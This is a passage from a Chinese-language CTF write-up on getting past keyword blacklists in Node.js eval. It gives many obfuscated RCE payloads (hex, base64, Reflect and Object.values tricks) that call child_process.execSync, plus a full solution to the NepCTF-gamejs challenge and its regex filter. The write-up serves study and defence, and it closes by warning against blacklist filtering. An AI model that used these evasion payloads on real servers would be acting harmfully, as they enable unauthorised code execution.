    require('child_process')['exe'%2b'cSync']('curl 127.0.0.1:1234')
###  2.4 模板字符串
相关内容可以参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals)，这里给出一个payload
> 模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。
    require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234')
###  2.5 concat连接
利用js中的concat函数连接字符串
    require("child_process")["exe".concat("cSync")]("curl 127.0.0.1:1234")
###  2.6 base64编码
这种应该是比较常规的思路了。
    eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString())
## 3\. 其他bypass方式
这一块主要是换个思路，上面提到的几种方法，最终思路都是通过编码或者拼接得到`exec`这个关键字，这一块考虑js的一些语法和内置函数。
###  3.1 Obejct.keys
实际上通过`require`导入的模块是一个`Object`，所以就可以用`Object`中的方法来操作获取内容。利用`Object.values`就可以拿到`child_process`中的各个函数方法，再通过数组下标就可以拿到`execSync`
    console.log(require('child_process').constructor===Object)
    //true
    Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')
###  3.2 Reflect
在js中，需要使用`Reflect`这个关键字来实现反射调用函数的方式。譬如要得到`eval`函数，可以首先通过`Reflect.ownKeys(global)`拿到所有函数，然后`global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]`即可得到eval
    console.log(Reflect.ownKeys(global))
    //返回所有函数
    console.log(global[Reflect.ownKeys(global).find(x=>x.includes('eval'))])
    //拿到eval
拿到eval之后，就可以常规思路rce了
    global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('global.process.mainModule.constructor._load("child_process").execSync("curl 127.0.0.1:1234")')
这里虽然有可能被检测到的关键字，但由于`mainModule`、`global`、`child_process`等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。
    global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29')
>
> 这里还有个小trick，如果过滤了`eval`关键字，可以用`includes('eva')`来搜索`eval`函数，也可以用`startswith('eva')`来搜索
###  3.3 过滤中括号的情况
在`3.2`中，获取到eval的方式是通过`global`数组，其中用到了中括号`[]`，假如中括号被过滤，可以用`Reflect.get`来绕
> `Reflect.get(target, propertyKey[,
> receiver])`的作用是获取对象身上某个属性的值，类似于`target[name]`。
所以取eval函数的方式可以变成
    Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('eva')))
后面拼接上命令执行的payload即可。
## 4\. NepCTF-gamejs
这个题目第一步是一个原型链污染，第二步是一个`eval`的命令执行，因为本文主要探讨一下eval的bypass方式，所以去掉原型链污染，只谈后半段bypass，代码简化后如下:
    const express = require('express')
    const bodyParser = require('body-parser')
    const app = express()
    var validCode = function (func_code){
      let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|"|'|\[|\+|\*/ig;
      return !validInput.test(func_code);
    };
    app.use(bodyParser.urlencoded({ extended: true }))
    app.post('/', function (req, res) {
      code = req.body.code;
      console.log(code);
      if (!validCode(code)) {
        res.send("forbidden!")
      } else {
        var d = '(' + code + ')';
        res.send(eval(d));
      }
    })
    app.listen(3000)
由于关键字过滤掉了单双引号，这里可以全部换成反引号。没有过滤掉`Reflect`，考虑用反射调用函数实现RCE。利用上面提到的几点，逐步构造一个非预期的payload。首先，由于过滤了`child_process`还有`require`关键字，我想到的是base64编码一下再执行
    eval(Buffer.from(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base64`).toString())
这里过滤了`base64`，可以直接换成
    `base`.concat(64)
过滤掉了`Buffer`，可以换成
    Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))
要拿到`Buffer.from`方法，可以通过下标
    Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`))))[1]
但问题在于，关键字还过滤了中括号，这一点简单，再加一层`Reflect.get`
    Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)
所以基本payload变成
    Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString()
但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。
    Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString())
在能拿到`Buffer.from`的情况下，用16进制编码也一样.
    Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e6328226375726c203132372e302e302e313a313233342229`,`he`.concat(`x`)).toString())
当然，由于前面提到的16进制和字符串的特性，也可以拿到eval后直接传16进制字符串
    Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes(`eva`)))(`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`)
感觉nodejs中对字符串的处理方式太灵活了，如果能eval的地方，最好还是不要用字符串黑名单做过滤吧。
感谢我前端大哥[semesse](https://blog.semesse.me/)的帮助
## 参考链接
  1. 
  2. 